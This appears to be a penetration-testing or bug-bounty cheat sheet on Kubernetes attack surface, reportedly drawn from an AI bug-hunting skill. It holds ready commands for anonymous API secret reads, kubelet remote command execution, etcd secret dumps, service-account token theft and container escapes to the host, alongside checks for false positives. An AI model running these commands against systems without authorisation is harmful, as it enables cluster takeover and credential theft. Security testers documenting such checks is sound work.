# Moraa — Kubernetes attack surface (exposed cluster components)

> Sourced from elementalsouls/Claude-BugHunter `hunt-k8s`. Cross-ref [[cloud]] (SA token → cloud IAM
> pivot), [[ssrf]] (metadata via nodes/proxy), [[supply-chain]] (CI/CD → cluster).

## Fingerprint & discover
```bash
nmap -sV -p 443,6443,8443,10250,10255,2379 $TARGET
curl -sk https://$TARGET:6443/version                       # gitVersion — gates which CVEs apply
```

## API server — anonymous access (read the ACTUAL rights, not the HTTP code)
```bash
curl -sk -X POST https://$TARGET:6443/apis/authentication.k8s.io/v1/selfsubjectreviews -d '{...}'
curl -sk -X POST https://$TARGET:6443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -d '{...}'
# Prove impact: actually read a Secret's decoded value
curl -sk https://$TARGET:6443/api/v1/secrets   # then base64 -d the data field
```
**Trap:** `200` on `/api/v1/namespaces` does NOT mean cluster-admin — RBAC-filtered lists are common
and low-impact on their own. Confirm with SelfSubjectRulesReview, then prove with an actual Secret read.

## Kubelet — port 10250 (RCE), port 10255 (info only)
```bash
curl -sk -X POST "https://$TARGET:10250/run/<ns>/<pod>/<container>" -d "cmd=id"    # direct output = RCE proof
# /exec returns a 302 to a SPDY/WebSocket stream — need kubeletctl or websocat, not curl alone
```
`10255` (read-only kubelet) is info-disclosure ONLY — no exec capability, don't conflate with 10250.

**When 10250 is firewalled but your token has `nodes/proxy` rights**, route through the API server instead:
```bash
curl -sk -X POST "https://$TARGET:6443/api/v1/nodes/<node>/proxy/run/<ns>/<pod>/<container>" -d "cmd=id"
```

## etcd — port 2379 (plaintext secret dump if unencrypted)
```bash
etcdctl --endpoints=http://$TARGET:2379 get /registry/secrets --prefix
```
Confirm you get decoded Secret BYTES, not just a key listing — `EncryptionConfiguration` may be active,
in which case the values are ciphertext and this isn't a finding.

## Service-account token
```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token   # from an already-compromised pod
# decode the JWT: check `aud` (audience) and `exp`
```
A projected/bound token's `aud` may be locked to a non-API-server target (e.g. Vault, an internal
service) — that means NO cluster API access even though it looks like a valid JWT. Verify actual
rights with SelfSubjectRulesReview before claiming cluster access.

## Container escape (from an already-compromised pod)
- **`docker.sock` mounted in the pod** → create a privileged container with the host `/` bind-mounted
- **CVE-2024-21626 ("Leaky Vessels")**, runc ≤1.1.11 → host FD escape via a malicious `WORKDIR`
- **EphemeralContainers with `hostPID`/`privileged`** → breaks pod isolation
- **cgroup v1 `release_agent` escape** (no `docker.sock` needed, just a privileged container):
  mount the cgroup pseudo-fs, write a host-executing script path into `release_agent`, trigger a
  release event — classic technique, still works on unpatched cgroup v1 hosts.
- **Exposed Docker API** (port 2375, no TLS) reachable from inside the pod's network = full host
  control without any container escape at all: `docker -H tcp://TARGET:2375 ps` /
  `docker -H tcp://TARGET:2375 run -v /:/host -it alpine chroot /host sh`.

## Dashboard / admission
- Token-less access under `/api/v1/<resource>/<namespace>` on an exposed dashboard
- Enumerate `ValidatingWebhookConfigurations` for an externally-reachable webhook URL (SSRF surface)
- Tiller (Helm 2, port 44134) historically accepted unauthenticated gRPC — check if it's still around

## False-positive traps (check every one before writing a finding)
| Trap | Reality check |
|---|---|
| HTTP 200 on API endpoints | Run SelfSubjectRulesReview; confirm an actual Secret read, not a filtered list |
| 10255 responding | Read-only, info-disclosure only — need 10250 for exec |
| `/exec` returns nothing on plain POST | It's a 302 to a stream; follow with a WebSocket client, don't call it patched |
| Projected SA token present | Decode `aud`/`exp` — a non-API-server audience = zero cluster impact |
| etcd responds | Confirm plaintext Secret bytes, not just key paths |
| `docker.sock` visible | Prove the escape: read the NODE's `/etc/hostname`, which differs from the container's |

## Severity
Critical: API→secret read, kubelet RCE, unencrypted etcd, host escape, CVE-2018-1002105.
High: dashboard token-less access, Tiller exposure. Medium: read-only kubelet, anon `/version`.
